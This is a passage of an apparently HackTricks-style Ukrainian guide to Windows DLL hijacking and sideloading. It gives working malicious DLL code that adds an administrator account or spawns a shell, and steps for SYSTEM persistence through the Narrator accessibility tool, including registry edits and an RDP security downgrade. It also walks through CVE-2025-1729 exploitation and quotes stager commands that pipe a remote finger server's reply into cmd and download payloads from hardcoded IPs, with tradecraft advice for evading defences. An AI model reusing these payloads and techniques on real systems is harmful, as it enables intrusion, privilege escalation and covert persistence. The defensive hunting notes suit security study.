  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Альтернативна DLL на C із точкою входу потоку</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Практичний приклад: перехоплення DLL локалізації TTS у Narrator OneCore (спеціальні можливості/ATs)

Windows Narrator.exe під час запуску досі шукає передбачувану DLL локалізації для конкретної мови, яку можна перехопити для довільного виконання коду та закріплення в системі.<sup>[[7]](#references)</sup>

Основні факти
- Шлях пошуку (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Застарілий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore є доступна для запису DLL, контрольована зловмисником, вона завантажується, а `DllMain(DLL_PROCESS_ATTACH)` виконується. Експорти не потрібні.

Пошук за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і перевірте спробу завантаження DLL за вказаним вище шляхом.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC: тиха робота
- Наївний hijack привертає увагу/підсвічує UI. Щоб залишатися непомітним, під час attach перелічіть потоки Narrator, відкрийте основний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його за допомогою `SuspendThread`; продовжуйте роботу у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Запуск і закріплення через конфігурацію Accessibility
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Після цього запуск Narrator завантажує підкладену DLL. На захищеному робочому столі (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається від імені SYSTEM на захищеному робочому столі.

Виконання від імені SYSTEM через RDP (латеральне переміщення)
- Дозвольте класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до хоста через RDP і на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається від імені SYSTEM на захищеному робочому столі.
- Виконання припиниться після закриття сеансу RDP — оперативно виконайте inject/migrate.

Bring Your Own Accessibility (BYOA)
- Можна клонувати запис реєстру вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його, щоб він вказував на довільний бінарний файл/DLL, імпортувати його, а потім задати `configuration` як ім’я цього AT. Так можна запускати довільний код через фреймворк Accessibility.

Примітки
- Для запису в `%windir%\System32` і зміни значень HKLM потрібні права адміністратора.
- Уся логіка payload може міститися в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Приклад: CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe

Цей приклад демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), зареєстрований як **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Відомості про вразливість

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 від імені користувача, який увійшов у систему.
- **Дозволи каталогу**: каталог доступний для запису користувачу `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **Поведінка пошуку DLL**: програма спочатку намагається завантажити `hostfxr.dll` з робочого каталогу, а за її відсутності записує в журнал "NAME NOT FOUND", що вказує на пріоритет пошуку в локальному каталозі.

### Реалізація експлойта

Зловмисник може розмістити шкідливу заглушку `hostfxr.dll` у тому самому каталозі, використавши відсутню DLL для виконання коду в контексті користувача:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Потік атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску запланованого завдання о 9:30 під обліковим записом поточного користувача.
3. Якщо під час виконання завдання увійшов адміністратор, шкідлива DLL запускається в сеансі адміністратора з середнім рівнем цілісності.
4. Використайте ланцюжок стандартних технік обходу UAC, щоб підвищити привілеї із середнього рівня цілісності до SYSTEM.

## Розбір випадку: MSI-дроппер із CustomAction + DLL side-loading через підписаний хост (wsc_proxy.exe)

Зловмисники часто поєднують дроппери на основі MSI із DLL side-loading, щоб виконувати payload у довіреному процесі з цифровим підписом.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. Під час встановлення з графічним інтерфейсом безшумно запускається CustomAction (наприклад, LaunchApplication або дія VBScript), яка відновлює наступний етап з вбудованих ресурсів.
- Дроппер записує легітимний EXE із цифровим підписом і шкідливу DLL в один каталог (приклад пари: підписаний Avast файл wsc_proxy.exe + контрольована зловмисником wsc.dll).
- Після запуску підписаного EXE порядок пошуку DLL у Windows спочатку знаходить wsc.dll у робочому каталозі й завантажує її, виконуючи код зловмисника в процесі з підписаним батьківським процесом (ATT&CK T1574.001).

Аналіз MSI (на що звернути увагу)
- Таблиця CustomAction:
  - Шукайте записи, що запускають виконувані файли або VBScript. Приклад підозрілого шаблону: LaunchApplication запускає вбудований файл у фоновому режимі.
  - В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані/розділені payload у CAB-файлі MSI:
  - Розпакування для адміністративного встановлення: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Або використайте lessmsi: lessmsi x package.msi C:\out
  - Шукайте кілька невеликих фрагментів, які об’єднуються та розшифровуються CustomAction на VBScript. Типовий процес:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Практичний sideloading із wsc_proxy.exe
- Розмістіть ці два файли в одній папці:
  - wsc_proxy.exe: легітимний підписаний host (Avast). Процес намагається завантажити wsc.dll за іменем зі своєї папки.
  - wsc.dll: DLL зловмисника. Якщо певні exports не потрібні, достатньо DllMain; інакше створіть proxy DLL і перенаправте потрібні exports до справжньої бібліотеки, запустивши payload у DllMain.
- Створіть мінімальний payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Для вимог до експорту використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб створити forwarding DLL, яка також виконує ваш payload.

- Ця техніка використовує механізм визначення імен DLL хост-бінарним файлом. Якщо хост використовує абсолютні шляхи або прапорці безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет завантаження, тому їх слід враховувати під час вибору хост-бінарного файла та набору експортів.

## Підписані тріади + зашифровані payload (розбір ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **трифайлової тріади**, щоб замаскуватися під легітимне програмне забезпечення й водночас зберігати основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Підписаний host EXE** – зловмисники використовують файли таких постачальників, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Вони перейменовують виконуваний файл так, щоб він нагадував бінарний файл Windows (наприклад, `conhost.exe`), але підпис Authenticode залишається чинним.
2. **Шкідлива loader DLL** – розміщується поруч із EXE під очікуваним ім’ям (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Зазвичай DLL є обфускованим MFC-бінарним файлом, створеним за допомогою фреймворку ScatterBrain; її єдине завдання — знайти зашифрований blob, розшифрувати його та відобразити ShadowPad у пам’ять за допомогою reflective mapping.
3. **Зашифрований payload blob** – часто зберігається в тому самому каталозі як `<name>.tmp`. Після відображення розшифрованого payload у пам’ять loader видаляє TMP-файл, щоб знищити криміналістичні докази.

Нотатки щодо tradecraft:

* Перейменування підписаного EXE зі збереженням початкового `OriginalFileName` у PE-заголовку дає змогу видати його за бінарний файл Windows, зберігши підпис постачальника. Тож наслідуйте звичку Ink Dragon розміщувати файли, які виглядають як `conhost.exe`, але насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, для більшості засобів контролю allowlisting достатньо, щоб ваша шкідлива DLL лежала поруч із ним. Зосередьтеся на налаштуванні loader DLL; зазвичай підписаний батьківський файл можна запускати без змін.
* Decryptor ShadowPad очікує, що TMP blob лежатиме поруч із loader і буде доступним для запису, щоб після відображення обнулити файл. Залиште каталог доступним для запису до завантаження payload; після завантаження в пам’ять TMP-файл можна безпечно видалити з міркувань OPSEC.

### Ланцюжок LOLBAS stager + sideloading поетапного архіву (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading із LOLBAS, щоб єдиним власним артефактом на диску була шкідлива DLL поруч із довіреним EXE:<sup>[[1]](#references)</sup>

- **Завантажувач віддалених команд (Finger):** прихований PowerShell запускає `cmd.exe /c`, отримує команди із сервера Finger і передає їх до `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, даючи операторам змогу змінювати second stage на сервері.

- **Вбудоване завантаження/розпакування:** Завантажте архів із нешкідливим розширенням, розпакуйте його та розмістіть цільовий файл sideload разом із DLL у випадковій папці `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` приховує перебіг завантаження та переходить за перенаправленнями; `tar -xf` використовує вбудований у Windows tar.

- **Запуск через WMI/CIM:** Запустіть EXE через WMI, щоб у телеметрії відображався процес, створений через CIM, під час завантаження DLL, розміщеної поруч:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Працює з бінарними файлами, які віддають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під довіреною назвою.

- **Пошук:** створюйте сповіщення про `forfiles`, коли одночасно використовуються `/p`, `/m` і `/c`; поза адміністративними скриптами таке трапляється рідко.


## Аналіз випадку: sideload NSIS-дропера + Bitdefender Submission Wizard (Chrysalis)

Під час нещодавнього вторгнення Lotus Blossom зловмисники використали довірений ланцюжок оновлення для доставки дропера, запакованого в NSIS, який розгортав sideload DLL і payload, що повністю працювали в пам’яті.<sup>[[13]](#references)</sup>

Послідовність дій
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, скидає туди перейменований `BluetoothService.exe` від Bitdefender Submission Wizard, шкідливий `log.dll` і зашифрований blob `BluetoothService`, а потім запускає EXE.
- EXE хоста імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob у пам’ять через mmap; `LogWrite` розшифровує його за допомогою потокового шифру на основі LCG (константи **0x19660D** / **0x3C6EF35F**, ключовий матеріал отримано з попереднього хешу), перезаписує буфер plaintext shellcode, звільняє тимчасові дані й передає йому керування.
- Щоб уникнути IAT, loader знаходить API, хешуючи назви експортів за допомогою **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує avalanche-перетворення в стилі Murmur (**0x85EBCA6B**) і порівнює результат із цільовими хешами з сіллю.

Основний shellcode (Chrysalis)
- Розшифровує основний модуль, схожий на PE, повторюючи операції додавання/XOR/віднімання з ключем `gQ2JR&9;` у п’ять проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress`, щоб завершити розв’язання імпортів.
- Відновлює рядки з назвами DLL під час виконання за допомогою побайтових перетворень rotate/XOR, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який обходить **PEB → InMemoryOrderModuleList**, розбирає таблицю експортів блоками по 4 байти із застосуванням змішування в стилі Murmur і вдається до `GetProcAddress`, лише якщо хеш не знайдено.

Вбудована конфігурація та C2
- Конфігурація міститься у скинутому файлі `BluetoothService` за **зміщенням 0x30808** (розмір **0x980**) і розшифровується RC4 із ключем `qwhvb^435h&*7`, відкриваючи URL C2 та User-Agent.
- Beacon-и формують профіль хоста з полями, розділеними крапками, додають на початок тег `4Q`, а потім шифрують RC4 із ключем `vAuig34%^325hGV` перед викликом `HttpSendRequestA` через HTTPS. Відповіді розшифровуються RC4 і обробляються перемикачем тегів (`4T` shell, `4V` виконання процесу, `4W/4X` запис файлу, `4Y` читання/exfil, `4\\` видалення, `4` перелік дисків/файлів + випадки передавання частинами).
- Режим виконання визначається аргументами командного рядка: без аргументів — встановлює persistence (служба/ключ Run), що вказує на `-i`; `-i` перезапускає себе з `-k`; `-k` пропускає встановлення й запускає payload.

Помічений альтернативний loader
- Під час того самого вторгнення було скинуто Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` із `C:\ProgramData\USOShared\`, поруч із яким містився `libtcc.dll`. Наданий зловмисниками вихідний код на C містив shellcode, який компілювався й запускався в пам’яті, не записуючи PE на диск. Відтворити це можна так:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Цей етап компіляції та запуску на основі TCC імпортував `Wininet.dll` під час виконання та завантажував shellcode другого етапу з жорстко заданої URL-адреси, забезпечуючи гнучкий loader, що маскується під запуск компілятора.

## Sideloading підписаного хоста з проксіюванням експортів і призупиненням потоку хоста

У деяких ланцюжках DLL sideloading застосовують **техніки підвищення стабільності**, щоб легітимний хост залишався активним достатньо довго для коректного завантаження наступних етапів і не аварійно завершувався після завантаження шкідливої DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістіть довірений EXE поруч зі шкідливою DLL, використовуючи очікуване ім’я залежності, наприклад `version.dll`.
- Шкідлива DLL **проксіює кожен очікуваний експорт** до справжньої системної DLL (наприклад, `%SystemRoot%\\System32\\version.dll`), щоб розв’язання імпортів проходило успішно, а процес хоста продовжував працювати.
- Після завантаження шкідлива DLL **пропатує точку входу хоста**, щоб основний потік потрапив у нескінченний цикл `Sleep`, а не завершився чи виконав код, який припинив би процес.
- Новий потік виконує власне шкідливе завдання: розшифровує ім’я або шлях DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне проксіювання DLL зберігає сумісність API, але не гарантує, що хост залишатиметься активним достатньо довго для наступних етапів.
- Призупинення основного потоку в `Sleep(INFINITE)` — простий спосіб утримувати підписаний процес у пам’яті, поки loader виконує розшифрування, підготовку або мережеве завантаження в робочому потоці.
- Пошук лише підозрілого `DllMain` може не виявити цей шаблон, якщо цікава поведінка починається після патчу точки входу хоста та запуску додаткового потоку.

Мінімальний робочий процес
1. Скопіюйте підписаний EXE хоста та визначте DLL, яку він завантажує з локального каталогу.
2. Створіть proxy DLL, що експортує ті самі функції та перенаправляє їх до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створіть робочий потік.
4. У цьому потоці пропатуйте точку входу хоста або початкову процедуру основного потоку так, щоб він зациклився на `Sleep`.
5. Розшифруйте ім’я/конфігурацію DLL наступного етапу та викличте `LoadLibrary` або вручну відобразіть payload у пам’ять.

Захисні напрямки пошуку
- Підписані процеси, що завантажують `version.dll` або подібні поширені бібліотеки з власного каталогу програми замість `System32`.
- Патчі пам’яті в точці входу процесу невдовзі після завантаження образу, особливо переходи/виклики, перенаправлені до `Sleep`/`SleepEx`.
- Потоки, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Proxy DLL із повним набором експортів, розміщені поруч із виконуваними файлами постачальника у доступних для запису проміжних каталогах, як-от `ProgramData`, `%TEMP%` або розпаковані архіви.

## References

- [1] [Red Canary – Аналітичні огляди розвідданих: січень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna — TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове шкідливе ПЗ, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL hijack поєднується з помічниками Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC — api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — цифрові двійники: анатомія еволюції кампаній із видавання себе за інших, що поширюють Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — спільні інтереси: аналіз кластерів загроз, націлених на уряд країни Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — усередині Ink Dragon: розкриття ретрансляційної мережі та внутрішньої роботи прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — бекдор Chrysalis: детальний аналіз інструментарію Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — ланцюжок HTB Bruno: ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — відстеження шпигунських кампаній іранської APT Screening Serpens у 2026 році](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — швидко й рішуче: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — дії завдань](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру країн Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn — формат PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs — виявлення варіанта SectopRAT, вбудованого в легітимне програмне забезпечення](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
